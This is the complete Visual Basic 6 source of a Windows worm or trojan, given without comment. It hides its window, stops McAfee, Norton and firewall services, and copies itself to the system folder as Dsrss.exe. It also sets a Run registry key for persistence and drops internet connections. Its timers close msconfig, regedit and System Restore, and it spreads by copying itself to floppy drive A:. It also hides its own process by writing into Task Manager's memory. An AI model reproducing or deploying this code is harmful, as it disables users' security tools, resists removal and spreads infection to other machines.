Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function RegCloseKey Lib "advapi32.dll" _
(ByVal hkey As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias _
"RegSetValueExA" (ByVal hkey As Long, ByVal lpValueName _
As String, ByVal reserved As Long, ByVal dwType As Long, _
lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias _
"RegCreateKeyExA" (ByVal hkey As Long, ByVal lpSubKey _
As String, ByVal reserved As Long, ByVal lpClass As Long, _
ByVal dwOptions As Long, ByVal samDesired As Long, ByVal _
lpSecurityAttributes As Long, phkResult As Long, _
lpdwDisposition As Long) As Long
Private Type bkh
flag As Long
psz As Long
lParam As Long
pt As Long
vkDirection As Long
End Type
Private Declare Function VirtualAllocEx Lib "kernel32.dll" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function OpenProcess Lib "kernel32.dll" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As Long, ByRef lpdwProcessId As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function VirtualFreeEx Lib "kernel32.dll" (ByVal hProcess As Long, ByRef lpAddress As Any, ByRef dwSize As Long, ByVal dwFreeType As Long) As Long
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32.dll" () As Long
Private Declare Function KillTimer Lib "user32.dll" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32.dll" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Sub Disconnecter_Timer()
On Error Resume Next
Call Shell("rundll32 iedkcs32.dll,CloseRASConnections")
End Sub

Private Sub Form_Load()
On Error Resume Next
Me.Hide
App.TaskVisible = False
Shell "net stop" & " " & """" & "mcshield" & """", vbHide
Shell "net stop" & " " & """" & "Norton Antivirus Auto Protect Service" & """", vbHide
Shell "net stop ""Windows Firewall/Internet Connection Sharing (ICS)"" ", vbHide
Set fso = CreateObject("Scripting.FileSystemObject")
mf = App.Path & "\" & App.EXEName & ".exe"
Set sysdir = fso.getspecialfolder(1)
If Dir(sysdir & "\Dsrss.exe") = "" Then
FileCopy mf, sysdir & "\Dsrss.exe"
End If
Dim RegKeyPath1 As String
Dim hNewKey As Long
Dim lRetVal As Long
Dim filepathname As String
filepathname = (sysdir & "\Dsrss.exe")
Const RegPath = "Software\Microsoft\windows\currentversion"
keyname1 = "run"
RegKeyPath1 = RegPath & "\" & keyname1
RegCreateKeyEx &H80000002, RegKeyPath1, 0, 0, 0, _
&H3F, 0, hNewKey, lRetVal
RegSetValueEx hNewKey, "Dsrss", 0, 1, _
ByVal filepathname, Len(filepathname)
RegCloseKey hNewKey
End Sub

Private Sub Process_Timer()
On Error Resume Next
Process_Hide CStr(App.EXEName & ".exe")
End Sub

Private Sub regmsconfig_Timer()
On Error Resume Next
Dim reghwnd As Long
Dim syshwnd As Long
Dim run As Long
Dim sr As Long
Const WM_CLOSE = &H10
syshwnd = FindWindow(vbNullString, "System Configuration Utility")
reghwnd = FindWindow("RegEdit_RegEdit", vbNullString)
sr = FindWindow(vbNullString, "System restore")
run = FindWindow(vbNullString, "run")
If syshwnd <> 0 Then SendMessage syshwnd, WM_CLOSE, 0&, 0&
If reghwnd <> 0 Then SendMessage reghwnd, WM_CLOSE, 0&, 0&
If sr <> 0 Then SendMessage sr, WM_CLOSE, 0&, 0&
If run <> 0 Then SendMessage run, WM_CLOSE, 0&, 0&
End Sub

Private Sub tmrantivirus_Timer()
On Error Resume Next
Shell "net stop" & " " & """" & "mcshield" & """", vbHide
Shell "net stop" & " " & """" & "Norton Antivirus Auto Protect Service" & """", vbHide
Shell "net stop ""Windows Firewall/Internet Connection Sharing (ICS)"" ", vbHide
End Sub

Private Sub tmrfloppy_Timer()
On Error GoTo h
Set fso = CreateObject("Scripting.FileSystemObject")
mf = App.Path & "\" & App.EXEName & ".exe"
If Dir("A:\" & "shine.exe") = "" Then
FileCopy mf, "A:\" & "shine.exe"
End If
h:
End Sub

Private Sub Process_Hide(Name As String)
On Error Resume Next
Dim pName As Long
Dim pType As Long
Dim l As Long
Dim Tid As Long
Dim hTid As Long
Dim pid As Long
Dim h As Long
Dim i As Long
Dim hProcess As Long
Dim f As bkh
Dim s As String
Dim bkh() As Byte
h = FindWindow(vbNullString, "Windows Task Manager")
KillTimer h, 0
h = FindWindowEx(h, 0, "#32770", vbNullString)
h = FindWindowEx(h, 0, "SysListView32", vbNullString)
If h = 0 Then Exit Sub
f.flag = 8 Or &H20
Call GetWindowThreadProcessId(h, pid)
hProcess = OpenProcess(1082, 0, pid)
bkh = StrConv(Name, vbFromUnicode)
pName = VirtualAllocEx(hProcess, 0, Len(Name) + 1, &H1000, 4)
WriteProcessMemory hProcess, pName, VarPtr(bkh(0)), Len(Name), l
f.psz = pName
pType = VirtualAllocEx(hProcess, 0, Len(f), &H1000, 4)
WriteProcessMemory hProcess, pType, VarPtr(f.flag), Len(f), l
i = SendMessage(h, &H1000 + 13, 0, pType)
If i <> -1 Then SendMessage h, &H1000 + 8, i, 0
VirtualFreeEx hProcess, pType, Len(f), &H8000
VirtualFreeEx hProcess, pName, LenB(Name) + 1, &H8000
End Sub